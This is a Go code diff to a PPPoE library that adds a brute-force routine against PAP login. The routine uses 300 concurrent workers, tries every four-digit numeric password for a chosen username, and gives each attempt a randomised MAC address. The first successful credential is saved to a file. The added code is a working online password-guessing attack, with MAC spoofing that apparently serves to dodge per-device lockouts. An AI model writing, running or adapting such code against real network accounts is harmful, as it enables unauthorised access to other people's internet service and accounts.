@@ -3,9 +3,11 @@ package packets
 import (
 	"bytes"
 	"encoding/binary"
+	"fmt"
 	"log"
 	"math/rand"
 	"net"
+	"os"
 	"time"
 
 	"github.com/dalaomai/pppoe-go/utils"
@@ -153,4 +155,55 @@ func handlePacketForPAPLogin(mac net.HardwareAddr, user string, pwd string, sess
 		}
 	default:
 	}
+}
+
+type PAPLoginSessionArg struct {
+	device string
+	mac    net.HardwareAddr
+	user   string
+	pwd    string
+}
+
+func BruteForcwPassword(device string, user string) {
+	// TODO 搞一个中断信号
+
+	result := make(chan PAP)
+	args := make(chan PAPLoginSessionArg, 1000)
+
+	for i := 0; i < 300; i++ {
+		go func() {
+			for arg := range args {
+				PAPLoginSession(arg.device, arg.mac, arg.user, arg.pwd, result)
+			}
+		}()
+	}
+
+	go func() {
+		for i := 10000; i > 999; i-- {
+			args <- PAPLoginSessionArg{
+				device: device,
+				mac:    getRandomAddr(),
+				user:   user,
+				pwd:    fmt.Sprint(i),
+			}
+		}
+	}()
+
+	resultF, err := os.OpenFile(".temp/result.txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, os.ModeAppend)
+	if err != nil {
+		logger.Fatal(err)
+	}
+	defer resultF.Close()
+
+	for pap := range result {
+		logger.Infof("%v %v %v", pap.Username, pap.Password, pap.Message)
+		if pap.Message != "user passwd error" || pap.Message == "not user" {
+			resultF.WriteString(fmt.Sprintf("%v %v %v\n", pap.Username, pap.Password, pap.Message))
+			os.Exit(0)
+		}
+	}
+}
+
+func getRandomAddr() net.HardwareAddr {
+	return net.HardwareAddr{0x80, byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32())}
 }
